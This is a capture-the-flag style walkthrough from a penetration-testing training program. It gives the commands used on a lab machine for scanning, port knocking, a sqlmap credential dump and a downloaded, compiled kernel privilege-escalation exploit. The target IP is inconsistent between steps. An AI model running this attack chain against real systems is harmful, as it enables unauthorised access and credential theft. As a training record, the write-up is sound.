# DEPI Machine Walkthrough
 
 
 
 This is a report of a penetration testing task we completed during the DEPI Training program. The training, sponsored by the National Telecommunications Regulatory Authority (NTRA) of Egypt, focused on the Vulnerability Analysis/Penetration Testing Track.
 
 ## Team Members

 1. Mohamed Mamdouh Abdulhamid
 2. Ahmed Amin Elkomy
 3. Zeyad Ashraf Mahmoud
 4. Mostafa Moataz
 
 ## Walkthrough
 
 
 ### Step 1: Discovering the Target IP
 
 1. Used the **MAC Address** to find the IP address with `netdiscover`.
 
    - **Target IP**: `192.168.207.133`
 
 
 
 ### Step 2: Port Scanning
 
 - Performed an Nmap scan: `nmap -sC -sV -p- <target_ip>`
 
   - Found only SSH port open.
 
 
 
 ### Step 3: Brute-Force Attempts
 
 - Tried logging in with username `smeagol` but without success.
 
 - Attempted brute-forcing the password using **Hydra**, but it failed.
 
 
 
 ### Step 4: Port Knocking
 
 - Identified a hint: "Knock Friend To Enter. Easy as 1,2,3."
 
 - Used Nmap to send port knocking sequences:
 
  ```bash
 
   nmap -Pn --host-timeout 100 --max-retries 0 -p 1 192.168.207.133
 
   nmap -Pn --host-timeout 100 --max-retries 0 -p 2 192.168.207.133
 
   nmap -Pn --host-timeout 100 --max-retries 0 -p 3 192.168.207.133
  ```
 
 
 ### Step 5: Web Application Enumeration
 
 1. Accessed the service through a browser but found no useful information.
 
 2. Checked the `/robots.txt` file and inspected the page source.
 
 3. Discovered a **Base64-encoded path** in the source code. After decoding it twice, found the path:
 
                 http://10.10.207.133:1337/978345210/index.php
 
 4. Visited the path and found a login page.
 
 
 
 ### Step 6: SQL Injection
 
 1. Used **Burp Suite** to intercept the login request and saved it as `post.txt`.
 
 2. Tested the form for SQL Injection vulnerabilities using **SQLmap**:
 
              sqlmap -r post.txt -p username
 
 3. Then Extracted the smeagol username and password.
 
             sqlmap -r post.txt -p username -D Webapp -T Users --dump
 
 
 
 ### Step 7: SSH Access and Privilege Escalation
 
 1. Logged into the machine via SSH using the credentials obtained.
 
 2. Attempted to access the /root directory but was unauthorized.
 
 3. Gathered OS and kernel information:
 
          uname -a
 
 4. Used searchsploit to find exploits for the kernel version:
 
          searchsploit ubuntu 14.04
 
 5. Selected and downloaded an exploit (39166.c) from Exploit-DB:
 
        wget https://www.exploit-db.com/download/39166
 
 6. Compiled and executed the exploit:
 
        gcc 39166.c -o exploit
 
        chmod +x exploit
 
        ./exploit
 
 7. Successfully gained root privileges and accessed the flag in the /root directory. 

